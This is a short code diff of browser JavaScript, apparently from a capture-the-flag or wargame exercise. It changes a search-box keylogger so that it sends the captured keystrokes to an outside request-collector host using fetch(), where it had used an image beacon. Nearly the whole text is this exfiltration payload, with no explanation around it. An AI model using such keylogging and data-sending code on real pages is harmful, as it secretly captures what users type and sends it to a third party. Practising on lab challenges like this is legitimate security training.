@@ -10,7 +10,5 @@ search_word.addEventListener("keyup", (e) => {
 const search_btn = document.getElementsByTagName("button")[0];
 
 search_btn.addEventListener('click', () => {
-    var i = new Image();
-    i.src = "https://ceyiqhh.request.dreamhack.games?keyword" + search_keylog;
-    search_keylog = "";
+    fetch("https://jperuml.request.dreamhack.games?k=" + search_keylog);
 })
